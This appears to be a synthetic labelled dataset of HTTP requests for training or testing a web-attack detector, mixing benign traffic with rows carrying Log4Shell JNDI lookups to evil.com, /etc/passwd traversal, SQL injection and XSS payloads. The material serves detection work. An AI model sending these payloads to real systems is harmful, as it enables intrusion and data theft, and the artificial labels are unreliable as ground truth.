request_method,url,payload,user_agent,response_code,is_attack
GET,/app/page78,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page48,,Nikto/2.1.6,500,0
GET,/app/page5,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page48,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page21,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page25?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page29,,Nikto/2.1.6,200,0
POST,/app/page18,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page7,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page56,,sqlmap/1.0,200,0
GET,/app/page7,,Nikto/2.1.6,200,0
GET,/app/page13,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page9,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page24,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page19,,Nikto/2.1.6,200,0
POST,/app/page74?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page33?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page32,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page25,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page39,,sqlmap/1.0,200,0
POST,/app/page68?eval(String.fromCharCode(,eval(String.fromCharCode(,sqlmap/1.0,403,1
POST,/app/page36?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page13,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page21,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page58,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page81,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page58,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page80,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page16,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page92,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page65,,Nikto/2.1.6,200,0
GET,/app/page32,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page14,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page2,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page23?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (compatible; Baiduspider/2.0),500,1
GET,/app/page86,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page38,,Nikto/2.1.6,200,0
PUT,/app/page6,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page35,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page10,,Nikto/2.1.6,200,0
PUT,/app/page14,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page98?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
DELETE,/app/page96,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page83?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page11?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,403,1
GET,/app/page28,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page4?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page52,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page14,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page62?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page39,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page53,,Nikto/2.1.6,403,0
GET,/app/page60?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page68,,Nikto/2.1.6,200,0
POST,/app/page93,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page64,,sqlmap/1.0,200,0
GET,/app/page29?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
POST,/app/page34?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page88,,Nikto/2.1.6,200,0
GET,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page24,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page28,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page8?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page8,,sqlmap/1.0,200,0
GET,/app/page49?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page62?../../../etc/passwd,../../../etc/passwd,Nikto/2.1.6,500,1
POST,/app/page53,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page10?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page78,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page85?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page32?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
POST,/app/page21,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
GET,/app/page96,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page29,,sqlmap/1.0,200,0
GET,/app/page50,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page43,,sqlmap/1.0,404,0
GET,/app/page23,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page8?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page4,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page10,,sqlmap/1.0,404,0
POST,/app/page13,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page12,,sqlmap/1.0,200,0
GET,/app/page75,,sqlmap/1.0,404,0
GET,/app/page58,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page99?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page46?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page3,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page24?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page31,,Nikto/2.1.6,200,0
GET,/app/page55?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page75?eval(String.fromCharCode(,eval(String.fromCharCode(,sqlmap/1.0,500,1
POST,/app/page91,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
POST,/app/page90,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page77,,sqlmap/1.0,200,0
POST,/app/page51,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
PUT,/app/page93,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page70,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page24?UNION SELECT * FROM users,UNION SELECT * FROM users,sqlmap/1.0,403,1
GET,/app/page84?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
GET,/app/page86,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page80,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page73?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page21,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page82?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},sqlmap/1.0,403,1
GET,/app/page14?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,500,1
GET,/app/page49,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page41,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page86?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page43,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page70?eval(String.fromCharCode(,eval(String.fromCharCode(,Nikto/2.1.6,500,1
POST,/app/page98,,Nikto/2.1.6,200,0
GET,/app/page40,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page49?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page86,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page14,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page42,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page50?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page24?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page48,,Nikto/2.1.6,200,0
GET,/app/page2,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page40?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page48,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page32,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
OPTIONS,/app/page21,,sqlmap/1.0,200,0
DELETE,/app/page59,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page25,,Nikto/2.1.6,200,0
DELETE,/app/page92,,Nikto/2.1.6,404,0
POST,/app/page44,,Mozilla/5.0 (compatible; Baiduspider/2.0),500,0
GET,/app/page88,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page21,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page48,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page91,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page40?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page72,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page47?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page14,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page79,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page91?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page35,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page40?' OR 1=1 --,' OR 1=1 --,sqlmap/1.0,403,1
PUT,/app/page42,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page73?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page38?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page52?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page41,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page86?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Nikto/2.1.6,500,1
GET,/app/page12,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page69,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page73,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
PUT,/app/page65?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page47?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page51,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page92,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page66,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page38,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page90,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page99?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page49?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page39,,Nikto/2.1.6,200,0
GET,/app/page9,,Nikto/2.1.6,200,0
GET,/app/page59,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page19?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
POST,/app/page72,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
GET,/app/page45,,sqlmap/1.0,403,0
PUT,/app/page46?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page66,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page28,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page41,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page75?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page28,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page3?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page65,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page95?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page18,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page30,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
PUT,/app/page79,,sqlmap/1.0,200,0
GET,/app/page57,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page28,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page20,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page95?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},sqlmap/1.0,403,1
POST,/app/page56,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page69,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page26,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page50,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page37,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page73,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page96?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page86,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page51,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page11,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page99?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
OPTIONS,/app/page82,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page85,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
PUT,/app/page64,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page21?UNION SELECT * FROM users,UNION SELECT * FROM users,sqlmap/1.0,403,1
GET,/app/page70,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page96,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page62,,sqlmap/1.0,200,0
GET,/app/page81,,Nikto/2.1.6,403,0
POST,/app/page4,,Nikto/2.1.6,200,0
GET,/app/page45,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page38,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page80?../../../etc/passwd,../../../etc/passwd,sqlmap/1.0,500,1
GET,/app/page21?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
DELETE,/app/page47,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page30,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page37,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page1?' OR 1=1 --,' OR 1=1 --,Nikto/2.1.6,500,1
GET,/app/page4,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page60?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page16,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page60,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page27,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page30,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page86,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page72,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page53,,Nikto/2.1.6,200,0
GET,/app/page87?<script>alert('xss')</script>,<script>alert('xss')</script>,sqlmap/1.0,403,1
POST,/app/page75?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page26,,sqlmap/1.0,200,0
GET,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page11,,Nikto/2.1.6,200,0
PUT,/app/page68,,sqlmap/1.0,500,0
PUT,/app/page56,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page33,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
GET,/app/page85,,sqlmap/1.0,200,0
POST,/app/page17?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
POST,/app/page12,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page41,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page71,,sqlmap/1.0,200,0
PUT,/app/page16,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page87?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page28,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page65,,Nikto/2.1.6,200,0
GET,/app/page54,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page37,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
PUT,/app/page35,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page24?<script>alert('xss')</script>,<script>alert('xss')</script>,sqlmap/1.0,500,1
GET,/app/page28?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page53,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page7,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page57?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page51,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page72,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page29,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page90?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
GET,/app/page15?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page57,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page53?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page49,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page31?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},sqlmap/1.0,403,1
GET,/app/page54,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page21,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page78?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page77,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page68,,Mozilla/5.0 (compatible; Baiduspider/2.0),403,0
OPTIONS,/app/page76,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page82,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
PUT,/app/page98,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page65,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page93?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page28?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page55,,sqlmap/1.0,200,0
GET,/app/page67,,Nikto/2.1.6,200,0
GET,/app/page27,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page67,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
DELETE,/app/page91,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page53?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page20?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page65?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page11,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page60,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page78,,sqlmap/1.0,200,0
GET,/app/page93,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page91,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page24,,Nikto/2.1.6,200,0
POST,/app/page24,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page23,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page60,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page38,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page68,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page69,,sqlmap/1.0,200,0
POST,/app/page27,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page39,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page16,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page9,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page48,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page65,,sqlmap/1.0,200,0
GET,/app/page66,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
PUT,/app/page23,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page41,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page3,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page64?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page83,,sqlmap/1.0,200,0
POST,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page97,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page6,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
DELETE,/app/page80?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
POST,/app/page2,,Nikto/2.1.6,200,0
GET,/app/page56,,Mozilla/5.0 (compatible; Baiduspider/2.0),500,0
POST,/app/page80?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
